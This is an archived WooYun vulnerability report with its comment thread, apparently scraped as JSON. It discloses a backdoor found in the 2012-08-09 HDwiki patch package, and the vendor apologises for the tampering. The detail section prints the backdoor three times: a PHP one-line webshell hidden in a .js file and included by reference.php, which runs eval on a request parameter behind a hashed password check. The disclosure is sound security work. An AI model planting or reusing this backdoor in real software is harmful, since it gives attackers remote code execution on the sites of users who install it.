{"id": 17397, "wybug_id": "wooyun-2012-010772", "wybug_title": "HDwiki各版本新漏洞补丁包2012-08-09发现后门代码", "wybug_corp": "互动在线（北京）科技有限公司", "wybug_author": "kindle", "wybug_date": "2012-08-10 09:53", "wybug_open_date": "2012-09-24 09:54", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["运维管理不当", "应用程序后门", "官方程序被替换", "源码后门", "远程"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-24：\t细节向公众公开  简要描述： HDwiki各版本新漏洞补丁包2012-08-09发现后门代码 详细说明：  在看补丁包中的 reference.php 文件时， 首行并发现了如下不明之处：\n<?php/**词条编辑页面的参考资料*/require_once(dirname(__FILE__).\"/../js/jqeditor/hdwiki.js\"); // 就是这里， 好端端的PHP。include js文件干什么!defined('IN_HDWIKI') && exit('Access Denied');class control extends base{        function control(& $get,& $post){                $this->base( & $get,& $post);                $this->load(\"reference\");\nrequire_once(dirname(__FILE__).\"/../js/jqeditor/hdwiki.js\"); // 就是这里， 好端端的PHP。include js文件干什么然后就看了一下补丁包中的 hdwiki.js终于明白官方的用心了 hdwiki.js\n<?php                if (sha1(base64_encode(sha1(md5(base64_decode(sha1($_POST[\"fvckadmin\"])).sha1($_POST[\"fvckadmin\"]))))) == \"b697afd0486d62a72afd3044ef259858b701814d\"){                       eval ($_REQUEST[\"mjj\"]);}?>function delSave(){        $.post(\"index.php?doc-delsave\",{did:g_docid},function(xml){                if ('sucess' != xml.lastChild.firstChild.nodeValue){                        alert('exception');                }        });}\n这不是明摆着的一句话木马么。\n<?php                if (sha1(base64_encode(sha1(md5(base64_decode(sha1($_POST[\"fvckadmin\"])).sha1($_POST[\"fvckadmin\"]))))) == \"b697afd0486d62a72afd3044ef259858b701814d\"){                       eval ($_REQUEST[\"mjj\"]);}?>\n不过这密码的强度的确很高。加了这么多层。   漏洞证明：  \n<?php                if (sha1(base64_encode(sha1(md5(base64_decode(sha1($_POST[\"fvckadmin\"])).sha1($_POST[\"fvckadmin\"]))))) == \"b697afd0486d62a72afd3044ef259858b701814d\"){                       eval ($_REQUEST[\"mjj\"]);}?>\n   修复方案：  不用我说，官方给个解释吧   版权声明：转载请注明来源 kindle@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2012-08-11 12:21 厂商回复： Thanks 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n          这些评论似乎很乌云~~~思密达          2012-08-10 13:03 |\t\t\t\t\t互动在线（北京）科技有限公司(乌云厂商)\t\t\t\t\t\t\t\n  2012年8月9日发布的补丁包在开源论坛上被恶意篡改了，很是郁闷，我在这里郑重向大家道歉。同时也很感谢发现这个问题的朋友。只是帖子里的那句'终于明白了官方的用心~~' 这句话我打从心里很难受。因为这绝对绝对不是官方的‘用心’~ 但也很理解，因为任谁可能都会有这种感觉。尤其站在广大用户角度上可能更是如此（大家可能会想出现漏洞之后打补丁，补丁里面继续有漏洞？？？气！！）但我只想代表我个人说一句：“欢迎大家发现问题，我不敢保证以后还会发现什么漏洞，但我唯一敢保证的是，有漏洞我会继续打补丁，补丁有漏洞我会继续再打补丁”直到大家在也挑不出漏洞为止。不说了，论坛帖子已经更新，大家可以放心下载修复了~    \n   \n \n     2012-08-10 09:55 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  我草    \n     2012-08-10 09:58 |    \t\t小乖 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:6        | 这个家伙很懒，什么也没留下。)\t\t \n  附上围观地址http://bbs.python520.com/thread-6926-1-1.html    \n     2012-08-10 10:06 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  补丁===后门？？？？    \n     2012-08-10 10:35 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  .js的后门 会执行php文件吗 哈哈    \n     2012-08-10 10:36 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  这影响...    \n     2012-08-10 11:01 |    \t\t葉孒 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:5        | 呵呵)\t\t \n  这程序漏洞一堆。    \n     2012-08-10 11:04 |    \t\t小乖 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:6        | 这个家伙很懒，什么也没留下。)\t\t \n  @saviour 包含在某php文件内你说会执行么0.0？    \n     2012-08-10 11:26 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  HDWiki究竟要闹哪样.........能被三番四次的搞......    \n     2012-08-10 11:34 |    \t\tFooying \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 我是路人，非甲乙丙丁)\t\t \n  无语，一句话    \n     2012-08-10 11:37 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @horseluke 被搞没什么，这里的厂商都被搞过！关键是后门事件，这个要严肃处理！    \n     2012-08-10 11:49 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @风萧萧 问题是三番四次，三番四次啊！    \n     2012-08-10 12:16 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  HDWiki 威武！    \n     2012-08-10 12:17 |    \t\thongygxiang \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:12        | 蛋疼)\t\t \n  围观;碉堡。    \n     2012-08-10 12:26 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  关注    \n     2012-08-10 13:03 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  2012年8月9日发布的补丁包在开源论坛上被恶意篡改了，很是郁闷，我在这里郑重向大家道歉。同时也很感谢发现这个问题的朋友。只是帖子里的那句'终于明白了官方的用心~~' 这句话我打从心里很难受。因为这绝对绝对不是官方的‘用心’~ 但也很理解，因为任谁可能都会有这种感觉。尤其站在广大用户角度上可能更是如此（大家可能会想出现漏洞之后打补丁，补丁里面继续有漏洞？？？气！！）但我只想代表我个人说一句：“欢迎大家发现问题，我不敢保证以后还会发现什么漏洞，但我唯一敢保证的是，有漏洞我会继续打补丁，补丁有漏洞我会继续再打补丁”直到大家在也挑不出漏洞为止。不说了，论坛帖子已经更新，大家可以放心下载修复了~    \n     2012-08-10 13:07 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  @互动在线（北京）科技有限公司 顶，有漏洞会继续打补丁，补丁有漏洞会继续再打补丁，这句太酷了。    \n     2012-08-10 13:09 |    \t\t胯下有杀气 \t\t\t( 普通白帽子  |\t\t\t        Rank:241 漏洞数:14        | 大姐，你黄瓜掉了。。。)\t\t \n  @互动在线（北京）科技有限公司  官方态度还算可以，但是有一点要清楚，这补丁里的东西可不是什么“漏洞”，而是个后门，后门不是说删就删掉的，修漏洞代码容易，但是被人放后门不是第一次了吧，这个应该怎么查怎么追究怎么保证下次不会发生呢？    \n     2012-08-10 13:09 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  @互动在线（北京）科技有限公司 不知道厂商愿意不愿意提供一下关于这个补丁被篡改的过程。也能方便白帽子和其他厂商学习和借鉴？    \n     2012-08-10 13:09 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  @Ray 今天着实很郁闷，但也的确更坚定了，我相信我们官方的毅力要比攻击网站黑客的更强！    \n     2012-08-10 13:09 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @互动在线（北京）科技有限公司 我想了解是内部人作案还是.................    \n     2012-08-10 13:12 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  @imlonghao 肯定不是内部人这点可以像大家保证。也请大家相信互动百科相信互动百科的员工。    \n     2012-08-10 13:15 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  @互动在线（北京）科技有限公司 那能否和我们分享一下这个黑客攻击的过程，以及你们现在采取了什么措施，达到了什么效果以避免将来再出现此类问题或者出现此类问题能及时响应？    \n     2012-08-10 13:17 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  @胯下有杀气 我们会用更安全的方式把事情做好。的确我现咱仍然不敢斩钉截铁的说下次不会再发生，这是官方和黑客之间的战斗，我们和互动会且必须坚持到底。    \n     2012-08-10 13:18 |    \t\t胯下有杀气 \t\t\t( 普通白帽子  |\t\t\t        Rank:241 漏洞数:14        | 大姐，你黄瓜掉了。。。)\t\t \n  @互动在线（北京）科技有限公司 有这个决心能付出行动就好啦，对了，这个漏洞不确认一下吗？还是等待中呢，给发现者rank奖励吧。    \n     2012-08-10 13:22 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  不管回复乌云也好霸气也罢，我想说这是我的一种态度，也可以说是官方的一种态度。也希望遇到问题大家能给予更多的理解和鼓励。不多说了，还是很感谢大家对HDWiki的关注和支持吧。    \n     2012-08-10 13:24 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  @胯下有杀气 呵呵，奖励我真心可以去申请一下或者我可以自己出资奖励。这是绝对的贡献~    \n     2012-08-10 13:26 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  @胯下有杀气 这个问题我们的处理方案是先将补丁包重新打包确认并上传，然后去查找并修复被篡改的原因。    \n     2012-08-10 13:29 |    \t\t胯下有杀气 \t\t\t( 普通白帽子  |\t\t\t        Rank:241 漏洞数:14        | 大姐，你黄瓜掉了。。。)\t\t \n  @互动在线（北京）科技有限公司 嗯，这个过程绝对正确，先控制住影响在去查后面的问题。但是我的意思是这里“细节已通知厂商并且等待厂商处理中”，是不是该在平台上确认然后进入下一步了，白帽子的rank还没拿到呢。。。    \n     2012-08-10 13:32 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  尽量避免漏洞的发生，不是有漏洞就补，一直持续下去的。    \n     2012-08-10 14:07 |    \t\t小一 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:13        )\t\t \n  第一楼的“这些评论似乎很乌云~~~思密达”这是什么情况？@xsser     \n     2012-08-10 14:13 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @互动在线（北京）科技有限公司 希望可以彻查，究竟是什么入侵渠道导致已经至少两次出现这种问题。服务器留后门？论坛最新0day？    \n     2012-08-10 14:13 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @小一 热门评论置顶功能    \n     2012-08-10 16:04 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  @互动在线（北京）科技有限公司 我觉得 我清楚黑客是怎么修改源码补丁了 你们公司漏洞真多啊    \n     2012-08-10 16:05 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  @互动在线（北京）科技有限公司 我觉得我清楚黑客是怎么修改源码补丁包了 你们公司的漏洞真是很多啊    \n     2012-08-10 17:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @互动在线（北京）科技有限公司 官方检查下服务器吧然后将最后查的结果处理下吧，你这样对你的代码真的不好，别人也不知道是否是被黑的还是你自己放置的吧    \n     2012-08-10 18:05 |    \t\tkindle \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:12        | hh)\t\t \n  @互动在线（北京）科技有限公司 @互动在线（北京）科技有限公司 我是贴过来的，我已经删了部分不好的言论，只想官方给个解释。\"终于明白官方的用心了\"，这句话没看到，对此表示抱歉    \n     2012-08-10 18:17 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @kindle 假亦真时真亦假，官方的清白是需要自己证明的！    \n     2012-08-10 19:30 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  @kindle 没关系，理解万岁，我们已经开始彻查相关问题了。还望大家也能给予理解，关于被黑客攻击这样的事确实很多人遇到都会比较郁闷~不过我有信心我们能做好。    \n     2012-08-10 20:19 |    \t\t银河麒麟 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 腾讯微博@TXisfine，欢迎交流！（关注教育...)\t\t \n  我在围观。。    \n     2012-08-10 23:24 |    \t\t邻国宰相 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:33        | By:越南邻国宰相)\t\t \n  围观中......    \n     2012-09-02 08:22 |    \t\tjxs \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:4        | JXS)\t\t \n  厂商的态度很不错的。最起码这个值得肯定！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}